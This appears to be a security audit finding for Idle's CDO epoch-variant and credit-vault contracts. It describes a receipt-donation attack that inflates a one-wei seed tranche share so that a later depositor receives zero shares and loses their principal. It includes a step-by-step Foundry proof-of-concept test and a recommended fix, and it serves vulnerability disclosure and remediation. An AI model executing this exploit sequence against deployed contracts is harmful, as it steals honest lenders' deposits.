### Title
Donated withdrawal receipts inflate a seed depositor's tranche price and steal later deposits - (File: `contracts/IdleCDOEpochVariant.sol`)

### Summary
A lender can donate `IdleCreditVault` withdrawal-receipt tokens back to the CDO, where they are counted again as strategy-token NAV. Because `_skimDonatedAssets` only removes raw underlying tokens, the donated receipt is treated as yield, inflates the tranche price of a remaining seed share, and can cause later depositors to receive zero shares through rounding. [1](#0-0) 

### Finding Description
`IdleCDOCreditVault.getContractValue` counts the entire `strategyToken` balance as vault NAV, without distinguishing strategy tokens backing active tranches from withdrawal receipts donated back to the CDO. [2](#0-1) 

A withdrawal request burns the requester's principal from the CDO and mints a receipt-denominated strategy-token balance to the requesting user. [3](#0-2) 

During the buffer phase, attacker A deposits one wei and attacker B deposits a large amount, requests a withdrawal, and transfers almost all resulting receipt tokens back to the CDO. The next depositor triggers `_updateAccounting`, which interprets the donated receipt balance as a NAV gain and assigns it to attacker A's one-wei AA share because B no longer owns active tranche tokens. [4](#0-3) 

The victim is then minted `victimDeposit * ONE_TRANCHE_TOKEN / inflatedPrice`; with a one-wei seed share and a donation larger than the victim deposit, integer division mints zero shares while `_mintShares` still adds the victim's underlying amount to `lastNAVAA`. [5](#0-4) 

After the zero-share mint, the donor transfers one additional wei of receipt token to the CDO. Attacker A's `requestWithdraw` runs `_updateAccounting` again, sees a nonzero NAV delta, recomputes the AA price over the sole one-wei supply, and registers a withdrawal claim containing both the donated receipt value and the victim's orphaned deposit. [6](#0-5) 

The donor's original pending request remains recorded in `pendingWithdraws` even though its receipt was subsequently burned inside the CDO by A's inflated request, so aggregate pending claims are larger than the principal supplied by lenders. [7](#0-6) 

### Impact Explanation
The attacker coalition can steal substantially all of a later depositor's principal once withdrawal requests are funded and claimed, less fees and rounding. With a one-wei seed share, any victim deposit smaller than the donated receipt mints zero shares and is captured by the inflated seed share. The inflated request also makes total pending withdrawals exceed lender principal, creating either a direct payout to the attacker or borrower underfunding/default. [8](#0-7) 

### Likelihood Explanation
The attack is available during the normal buffer phase in fixed-APR mode and requires only two attacker-controlled KYC-passing lender addresses plus a later victim deposit. The donor must sacrifice or over-collateralize enough receipt value to make the victim's share mint round to zero, but the coalition recovers that value through the seed account's inflated request, making the victim deposit the net profit. No owner, manager, guardian, borrower, or oracle manipulation is required. [9](#0-8) 

### Recommendation
Do not count receipt strategy tokens that were transferred directly to the CDO as new NAV. Track expected managed strategy-token principal separately from the raw ERC20 balance, or skim `strategyToken.balanceOf(cdo) - expectedPrincipal` alongside raw underlying donations. Additionally, prevent withdrawal-request users from having fewer receipt tokens than their outstanding receipt basis, or account for donated/burned receipts when processing later requests.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../../contracts/IdleCDOEpochVariant.sol";
import "../../contracts/IdleCDOTranche.sol";
import "../../contracts/strategies/idle/IdleCreditVault.sol";
import "../../contracts/interfaces/IERC20Detailed.sol";

contract ReceiptDonationInflationPoC is Test {
    IdleCDOEpochVariant cdo;
    IdleCreditVault creditVault;
    IdleCDOTranche aa;
    IERC20Detailed underlying;

    address attackerA = makeAddr("attackerA-seed");
    address attackerB = makeAddr("attackerB-donor");
    address victim = makeAddr("victim");

    function test_receiptDonation_inflatesSeedShareAndOrphansVictimDeposit()
        external
    {
        /*
         * Assumed existing fixture:
         * - cdo is an initialized IdleCDOEpochVariant in buffer phase.
         * - creditVault == IdleCreditVault(cdo.strategy()).
         * - aa == IdleCDOTranche(cdo.AATranche()).
         * - underlying == IERC20Detailed(cdo.token()).
         * - attackerA, attackerB and victim satisfy isWalletAllowed.
         * - performance and management fees are zero for clean math.
         */

        uint256 seed = 1;
        uint256 donorPrincipal = 1_000_000e6;
        uint256 victimDeposit = 100_000e6;

        // Attacker A leaves a one-wei active share.
        deal(address(underlying), attackerA, seed);
        vm.startPrank(attackerA);
        underlying.approve(address(cdo), seed);
        cdo.depositAA(seed);
        vm.stopPrank();

        // Attacker B supplies principal and converts it into a receipt.
        deal(address(underlying), attackerB, donorPrincipal);
        vm.startPrank(attackerB);
        underlying.approve(address(cdo), donorPrincipal);
        cdo.depositAA(donorPrincipal);

        uint256 donorShares = aa.balanceOf(attackerB);
        cdo.requestWithdraw(donorShares, address(aa));

        // Keep 1 wei to trigger a second accounting update after the victim deposits.
        uint256 receipt = creditVault.balanceOf(attackerB);
        creditVault.transfer(address(cdo), receipt - 1);
        vm.stopPrank();

        assertEq(aa.balanceOf(attackerB), 0);
        assertEq(aa.totalSupply(), seed);

        // Victim deposit updates accounting after the donation. Its share mint
        // rounds to zero while its underlying is still added to AA NAV.
        deal(address(underlying), victim, victimDeposit);
        vm.startPrank(victim);
        underlying.approve(address(cdo), victimDeposit);
        uint256 mintedToVictim = cdo.depositAA(victimDeposit);
        vm.stopPrank();

        assertEq(mintedToVictim, 0);
        assertEq(aa.balanceOf(victim), 0);

        // A one-wei receipt donation creates a nonzero NAV delta and reprices
        // attacker's sole share over the donated receipt plus victim deposit.
        vm.prank(attackerB);
        creditVault.transfer(address(cdo), 1);

        vm.prank(attackerA);
        uint256 inflatedRequest =
            cdo.requestWithdraw(0, address(aa));

        // The seed share now claims the donor's recycled principal, the victim's
        // orphaned deposit, and any withdrawal interest.
        assertGt(inflatedRequest, donorPrincipal + victimDeposit);
        assertGe(
            creditVault.balanceOf(attackerA),
            inflatedRequest
        );

        // B's original request is still pending even though its donated receipt
        // was burned as CDO strategy-token inventory by A's inflated request.
        assertGe(
            creditVault.pendingWithdraws(),
            receipt + inflatedRequest
        );

        // Aggregate pending claims now exceed lender principal, so funding the
        // epoch either pays attacker A more than coalition cost or underfunds
        // honest receipts.
        assertGt(
            creditVault.pendingWithdraws(),
            seed + donorPrincipal + victimDeposit
        );
    }
}
```

### Citations

**File:** contracts/IdleCDOEpochVariant.sol (L643-649)
```text
  /// @notice Deposit funds in the vault. Overrides the parent method and adds a check for wallet 
  function _deposit(uint256 _amount, address _tranche) internal override whenNotPaused returns (uint256) {
    _checkNotAllowed(!isWalletAllowed(msg.sender));
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();
    // do the inherited deposit flow
    return super._deposit(_amount, _tranche);
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-790)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);

    // Programmable borrower deployments do not support instant withdrawals.
    // If apr decresed wrt last epoch, request instant withdraw and burn tranche tokens directly
    // we compare unscaled aprs
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
      }
    }

    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
```

**File:** contracts/IdleCDOEpochVariant.sol (L793-796)
```text
  /// @notice Transfer donated assets to the feeReceiver
  function _skimDonatedAssets() internal {
    _transferUnderlyings(feeReceiver, _contractTokenBalance(token));
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L125-128)
```text
  function getContractValue() public override view returns (uint256) {
    // Credit vault strategy tokens are minted 1:1 with underlyings and use the same decimals.
    return _contractTokenBalance(strategyToken) + _contractTokenBalance(token) - unclaimedFees;
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L306-336)
```text
    int256 totalGain = int256(_nav) - int256(_lastNAV);
    // Ordinary zero-delta interactions keep their saved price for compatibility. Forced
    // accounting recomputes NAV per share, which is required after discounted mid-epoch deposits.
    if (totalGain == 0 && !skipDefaultCheck) return (_tranchePrice(_tranche), 0);

    // Remove performance fee for gains
    if (totalGain > 0) {
      totalGain -= totalGain * int256(fee) / int256(FULL_ALLOC);
    }

    bool _isAATranche = _tranche == AATranche;
    // A class with no saved NAV cannot be revived by later gains. If only this class has saved
    // NAV, it receives the full gain or loss; otherwise both classes participate.
    if (_lastTrancheNAV == 0) {
      _totalTrancheGain = 0;
    } else if (_lastNAV == _lastTrancheNAV) {
      _totalTrancheGain = totalGain;
    } else {
      if (totalGain > 0) {
        // Split the net gain, according to _trancheAPRSplitRatio, with precision loss favoring the AA tranche.
        int256 totalBBGain = totalGain * int256(FULL_ALLOC - _trancheAPRSplitRatio) / int256(FULL_ALLOC);
        // The new NAV for the tranche is old NAV + total gain for the tranche
        _totalTrancheGain = _isAATranche ? (totalGain - totalBBGain) : totalBBGain;
      } else {
        int256 maxBBLoss = -int256(lastNAVBB);
        int256 totalBBLoss = totalGain > maxBBLoss ? totalGain : maxBBLoss;
        _totalTrancheGain = _isAATranche ? totalGain - totalBBLoss : totalBBLoss;
      }
    }
    // Split the new NAV (_lastTrancheNAV + _totalTrancheGain) per tranche token
    _virtualPrice = uint256(int256(_lastTrancheNAV) + _totalTrancheGain) * ONE_TRANCHE_TOKEN / trancheSupply;
```

**File:** contracts/IdleCDOCreditVault.sol (L344-361)
```text
  function _mintSharesAtCurrPrice(uint256 _amount, address _to, address _tranche) internal virtual returns (uint256 _minted) {
    // calculate # of tranche token to mint based on current tranche price: _amount / tranchePrice
    _minted = _amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche);
    _mintShares(_tranche, _to, _minted, _amount);
  }

  /// @notice mint tranche tokens and updates tranche last NAV
  /// @param _tranche tranche address
  /// @param _to receiver address of the newly minted tranche tokens
  /// @param _shares number of tranche tokens to mint
  /// @param _underlyings amount of underlyings added to the tranche
  function _mintShares(address _tranche, address _to, uint256 _shares, uint256 _underlyings) internal {
    IdleCDOTranche(_tranche).mint(_to, _shares);
    // update NAV with the _amount of underlyings added
    if (_tranche == AATranche) {
      lastNAVAA += _underlyings;
    } else {
      lastNAVBB += _underlyings;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L272-294)
```text
    // burn strategy tokens from cdo (we don't burn future interest here, only the principal)
    _burn(msg.sender, _principal);
    // mint equal amount of strategy tokens to the user as receipt (interest included), useful in case of default
    _mint(_user, _amount);
    // A successfully closed pool already recalled all funds and has no later stopEpoch.
    if (!isClosed) {
      // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
      pendingWithdraws += _amount;
    }
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L338-349)
```text
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```
